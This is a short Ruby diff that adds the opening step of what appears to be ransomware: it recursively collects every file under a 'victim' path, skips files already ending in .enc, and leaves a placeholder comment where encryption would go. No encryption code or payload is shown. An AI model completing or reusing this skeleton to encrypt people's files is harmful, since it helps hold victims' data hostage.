@@ -1,0 +1,4 @@
+# 1. grab all files recursive (skip dirs, skip already .enc)
+Dir.glob("path/to/victim/**/*").select { |f| File.file?(f) && !f.end_with?(".enc") }.each do |f|
+  # encrypt f here
+end
